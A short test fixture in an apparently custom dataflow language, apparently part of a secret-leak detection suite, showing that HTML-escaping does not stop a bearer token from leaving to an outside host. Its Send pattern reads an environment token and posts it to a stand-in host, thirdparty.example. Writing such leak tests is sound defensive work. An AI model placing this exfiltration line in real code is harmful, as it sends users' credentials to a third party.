// Threat: the escaped secret leaving to a third-party service in the HTTP request body.
// Attack: escape_html does not lower the confidentiality (A2) — the bearer token
// delivered to the external host intact (the http_post positional logic: arg 1 — the body).
pattern Send(data: String) -> String {
  let _ = http_post("https://thirdparty.example/report", escape_html(env("MLOG_LEAK_SUITE_TOKEN")))
  return "sent"
}
flow Main { input: String = data -> Send -> output }
